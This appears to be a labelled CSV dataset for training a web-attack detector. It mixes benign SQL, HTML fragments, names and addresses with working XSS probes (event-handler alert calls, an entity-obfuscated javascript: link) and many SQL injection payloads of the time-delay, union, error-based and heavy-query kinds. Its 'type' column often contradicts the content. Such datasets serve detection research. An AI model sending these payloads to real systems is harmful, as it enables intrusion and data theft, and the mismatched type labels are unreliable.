Text,Label,type
"<base onkeypress=""alert(1)"" contenteditable>test</base>",2,xss
SELECT * FROM expression WHERE path = 'touch' LIMIT 3,0,sql
5739-5738,1,sql
3.59196E+15,0,sql
" end and    (    (   ""kvts"" like ""kvts",1,xss
"<template ondblclick=""alert(1)"">test</template>",2,xss
"  UPDATE collect SET pocket =  'particular', City =  'rest' WHERE struck =  limited",0,sql
SELECT * FROM parent FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
else dbms_lock.sleep  (  0  ) ,1,sql
"<div draggable=""true"" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable>drop here</nextid>",2,xss
malditamente,0,sql
"<blockquote onbeforecopy=""alert(1)"" contenteditable>test</blockquote>",2,xss
"<h3><span class=""mw-headline"" id=""Art"">Art ",0,xss
SELECT * FROM build WHERE fed NOT LIKE '[happen]%',0,xss
"	 </span> <span class=""toctext"">Video games ",0,xss
<font onpointerdown=alert(1)>XSS</font>,2,xss
<textarea autofocus onfocusin=alert(1)>test</textarea>,2,xss
</div>,0,xss
ling-yu,0,xss
<frameset id=x tabindex=1 onfocus=alert(1)></frameset>,2,xss
1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and '%'  =  ',1,sql
SELECT * FROM lift WHERE everyone BETWEEN 'joy' AND 'construction',0,sql
yoselie,0,xss
SELECT * FROM wet FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<div class=""toctree-wrapper compound"">",0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"<map onpaste=""alert(1)"" contenteditable>test</map>",2,xss
end and    (    (   'pfrt'  =  'pfrt,1,sql
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""uglh"" like ""uglh",1,xss
	 </span></a></dt><dd>Send email notifications when certain events occur.</dd>,0,xss
"<div draggable=""true"" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>",2,xss
"1""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
 ,0,xss
"1  )   as mnyy where 4409  =  4409 union all select null,null,null,null--",1,sql
lopiano,0,sql
1'   )    )    as grne where 9003  =  9003 order by 1--,1,sql
"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=alert(1)></image>",2,xss
38747118f,0,sql
"1'||  (  select 'qjwf' from dual where 3187  =  3187 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1,sql
calle codigo correspondencia oficial correos-telegrafos s/n 9a,0,sql
5.77329E+15,0,xss
skolnik-daye@joll.ws,0,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
SELECT Count ( * )  AS sail,0,xss
SELECT * FROM mass WHERE NOT little = 'harder'  AND NOT share = 'automobile',0,sql
select   (  case when   (  2968  =  2021  )   then 1 else 2968*  (  select 2968 from master..sysdatabases  )   end  )  --,1,sql
 </li>,0,xss
"1"" where 9804  =  9804 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
8n66ies4a,0,sql
"<menuitem onmouseenter=""alert(1)"">test</menuitem>",2,xss
"-7084  )   where 2260  =  2260 or elt  (  1032  =  1032,3623  )  --",1,sql
"  SELECT fifth,split,stream FROM member LEFT JOIN Orders ON together.additionalID =  sad.small ORDER BY copy.gray",0,sql
	 </span></a></dt><dd>Learn how to use contracts for testing your spiders.</dd>,0,xss
"  SELECT besideID AS ID, joined AS paint FROM globe",0,sql
"<style>:target {color: red;}</style><cite id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></cite>",2,xss
SELECT * FROM move WHERE Price NOT BETWEEN 10 AND 20,0,xss
SELECT * FROM play WHERE aware  BETWEEN 10 AND 20,0,sql
sandberg@3horas.tl,0,xss
"<style>:target {transform: rotate(180deg);}</style><iframe id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></iframe>",2,xss
"  SELECT POWER ( 4, 2 ) ;",0,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",1,sql
"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",1,xss
"  UPDATE making SET had =  'know', City =  'means' WHERE mind =  object",0,sql
 ,0,xss
"1%' and make_set  (  1227  =  5627,5627  )   and '%'  =  '",1,sql
"c/ aulencia, 84",0,xss
SELECT AVG ( office ) FROM among,0,sql
"1%'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '%'  =  '",1,sql
"<table onmouseover=""alert(1)"">test</table>",2,xss
SELECT * FROM class WHERE minute NOT LIKE 'best%',0,xss
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,sql
"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
1'   )    )    as xqam where 6750  =  6750,1,sql
SELECT half,0,sql
SELECT * FROM joined,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20141129044821/http://www.aaai.org/Library/Symposia/Fall/fs05-06"">""Machine Ethics"" </a>. <i>aaai.org </i>. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.aaai.org/Library/Symposia/Fall/fs05-06"">the original </a> on 29 November 2014. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=aaai.org&amp;rft.atitle=Machine+Ethics&amp;rft_id=http%3A%2F%2Fwww.aaai.org%2FLibrary%2FSymposia%2FFall%2Ffs05-06&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1%'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
<animatemotion onpointerup=alert(1)>XSS</animatemotion>,2,xss
<head id=x tabindex=1 ondeactivate=alert(1)></head><input id=y autofocus>,2,xss
"-9439""  )   where 9460  =  9460 or   (  9497  =  9586  )  *9586--",1,sql
"	 </span> <span class=""reference-text"">This is based on <a href=""/wiki/Mary%27s_Room"" class=""mw-redirect"" title=""Mary&#39;s Room"">Mary's Room </a>, a thought experiment first proposed by <a href=""/wiki/Frank_Cameron_Jackson"" title=""Frank Cameron Jackson"">Frank Jackson </a> in 1982 ",0,xss
SELECT COUNT ( flowID ) FROM vapor,0,sql
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;145–62, 197–203 </li>",0,xss
"c/ de la villa claudia 44, 4b",0,sql
"<cite onbeforecopy=""alert(1)"" contenteditable>test</cite>",2,xss
	 </span> </h2>,0,xss
1'  )   as pwqs where 2291  =  2291,1,sql
SELECT * FROM twenty WHERE wrote BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"<ul><li><a href=""/wiki/Ambient_intelligence"" title=""Ambient intelligence"">Ambient intelligence </a>",0,xss
28529,0,sql
"-8021'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk",1,sql
caridad,0,sql
<dt>Subsymbolic form of some commonsense knowledge </dt>,0,xss
</div>,0,xss
follosas,0,sql
1%'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   '%'  =  ',1,sql
arrazua-ubarrundia,0,sql
select   (  case when   (  5390  =  7419  )   then 5390 else 5390*  (  select 5390 from mysql.db  )   end  )  #,1,sql
c/ castaos 55 6-g,0,xss
"<track ondblclick=""alert(1)"">test</track>",2,xss
"1'  )   where 9454  =  9454 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"-4944%""   )    )    or make_set  (  1084  =  1988,1988  )   and    (    (   ""%""  =  """,1,sql
ronet_huebner@nikemujeres.bm,0,xss
1?i0l,0,sql
 ,0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/asyncio.html"">asyncio</a></li>",0,xss
"1  )   as tkkn where 7832  =  7832   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,xss
whitman,0,sql
"1'  )   as bdei where 9531  =  9531 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
-2374  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  2576  =  2576,1,xss
1 where 4153  =  4153 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
"<li><a href=""/wiki/Cliff_Joslyn"" title=""Cliff Joslyn"">Cliff Joslyn </a> </li>",0,xss
1   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   6406  =  6406,1,xss
"<li><a href=""/wiki/McCarthy_Formalism"" title=""McCarthy Formalism"">McCarthy Formalism </a> </li>",0,xss
"  SELECT * FROM limited WHERE to NOT IN  ( 'struck', 'long', 'machine' )  ",0,sql
SELECT COUNT ( affect ) FROM headed,0,sql
SELECT AVG ( melted ) FROM greatly,0,sql
lerumeur@phd-photodecor.sj,0,sql
<svg><samp onload=alert(1)></samp>,2,xss
SELECT knew FROM basket UNION ALL SELECT impossible FROM heading ORDER BY announced,0,sql
"<style>:target {color: red;}</style><plaintext id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></plaintext>",2,xss
SELECT * FROM along,0,sql
select   (  case when   (  5152  =  7853  )   then 5152 else 5152*  (  select 5152 from mysql.db  )   end  )  #,1,xss
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://www.igmchicago.org/surveys/robots-and-artificial-intelligence"">""Robots and Artificial Intelligence"" </a>. <i>www.igmchicago.org </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">3 July ",0,xss
alcarrs,0,xss
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ukzb'  =  'ukzb,1,sql
"1 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
SELECT * FROM colony  WHERE cook = everybody,0,xss
"<dt><a class=""reference internal"" href=""topics/link-extractors.html""><span class=""doc"">Link Extractors",0,xss
"-1168   )    )    as vlol where 3475  =  3475 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,xss
1'||  (  select 'cfff' where 4994  =  4994,1,sql
"<html onmouseout=""alert(1)"">test</html>",2,xss
"<header onmouseenter=""alert(1)"">test</header>",2,xss
"1'  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
<rp onpointerover=alert(1)>XSS</rp>,2,xss
"  SELECT kill AS football, supply AS [drove]  FROM saved",0,xss
03206041w,0,sql
"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",1,sql
	 </span>(1300) </li>,0,xss
<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>,2,xss
"<li id=""cite_note-Matz_et_al_2017-340""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Matz_et_al_2017_340-0"">^ </a> </b> ",0,xss
"<strike onmousedown=""alert(1)"">test</strike>",2,xss
"1"" where 4345  =  4345 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,sql
"-2216""  )   where 6692  =  6692 union all select 6692,6692,6692#",1,sql
SELECT * FROM living WHERE science = 'seen' LIMIT 3,0,sql
yihban,0,xss
"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>",2,xss
"SELECT * FROM mother WHERE improve BETWEEN ""greatest"" AND    ""circle""",0,sql
1   )    )    as somz where 1598  =  1598,1,sql
"-6108'  )   union all select 2519,2519,2519,2519--",1,sql
  </div>,0,xss
"1""  )   as eefe where 5290  =  5290 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,sql
1 where 5443  =  5443,1,sql
"1'   )    )    as jntr where 5051  =  5051 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sql
marschew,0,xss
SELECT * FROM theory,0,sql
" select * from users where id  =  1 or "";{"" or 1  =  1 -- 1",1,sql
select   (  case when   (  8716  =  1338  )   then 1 else 8716*  (  select 8716 from master..sysdatabases  )   end  )  --,1,sql
"<datalist onclick=""alert(1)"">test</datalist>",2,xss
duchement tenza,0,sql
2502,0,sql
fariba,0,sql
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""uzjn""  =  ""uzjn",1,sql
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe,2,xss
"<img onclick=""alert(1)"">test</img>",2,xss
"	 </span> <span class=""reference-text""><a href=""#CITEREFRussellNorvig2009"">Russell &amp; Norvig 2009 </a>. ",0,xss
parilli cresta,0,sql
DELETE FROM herd WHERE mine = 'bush',0,sql
"<div draggable=""true"" contenteditable>drag me</div><input ondrop=alert(1) contenteditable>drop here</input>",2,xss
select   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  select 7033 from information_schema.character_sets  )   end  )  #,1,xss
4631,0,sql
"<meta onbeforepaste=""alert(1)"" contenteditable>test</meta>",2,xss
"c/ virgen de la paloma, 107",0,xss
"<style>@keyframes slidein {}</style><link style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></link>",2,xss
"hospitalet de llobregat, l'",0,xss
79564193v,0,sql
	 </span>,0,xss
"paso de la soledad, 130 10?f",0,sql
"1"" rlike   (  select   (  case when   (  3711  =  3313  )   then 1 else 0x28 end   )    )    and ""iqlh"" like ""iqlh",1,sql
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1,xss
-6529'  )   or   (  4309  =  1601  )  *1601,1,sql
SELECT * FROM below WHERE tonight = 'sick'  AND  ( year = 'labor' OR she = 'too' ) ,0,sql
"SELECT LOWER ( ""SQL Tutorial is FUN!"" ) ; ",0,sql
norean,0,sql
1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,xss
<label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>,2,xss
"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;327–335, 434–435 </li>",0,xss
DELETE FROM thou WHERE needs = 'force',0,sql
"  SELECT * FROM believed WHERE was IN  ( 'canal', 'wall', 'excellent' )  ",0,xss
"<details ondblclick=""alert(1)"">test</details>",2,xss
"1""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""fpwu"" like ""fpwu",1,xss
SELECT * FROM habit 3,0,sql
"	 </span> <span class=""reference-text"">",0,xss
"<basefont oncut=""alert(1)"" contenteditable>test</basefont>",2,xss
"<data onbeforecopy=""alert(1)"" contenteditable>test</data>",2,xss
"<label oncontextmenu=""alert(1)"">test</label>",2,xss
mcavoy-zabczynski@discotecateatre.gt,0,xss
"1%'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
<base onpointermove=alert(1)>XSS</base>,2,xss
 </li>,0,xss
SELECT MIN ( am )  AS television FROM can,0,sql
<meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>,2,xss
"1%""   )    )    and sleep  (  5  )  #",1,xss
"1'  )   where 6328  =  6328 union all select null,null,null,null,null,null,null,null,null#",1,sql
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,1,xss
"<head oncontextmenu=""alert(1)"">test</head>",2,xss
SELECT COUNT ( pot )  FROM be,0,xss
<img src=validimage.png onload=alert(1)>,2,xss
empel6tarse,0,sql
SELECT * FROM rubber FETCH FIRST 3 ROWS ONLY,0,xss
"<style>@keyframes x{}</style><del style=""animation-name:x"" onanimationend=""alert(1)""></del>",2,xss
"SELECT CONV ( 88, 10, 16 ) ; ",0,xss
morosa,0,sql
"<div id=""mw-fr-revisiondetails-wrapper"" style=""position:relative;"">",0,xss
SELECT * FROM  ( SELECT brother FROM lesson ) ,0,sql
carminante,0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
SELECT * FROM seed WHERE hot = 'lovely'  OR conversation = 'century',0,sql
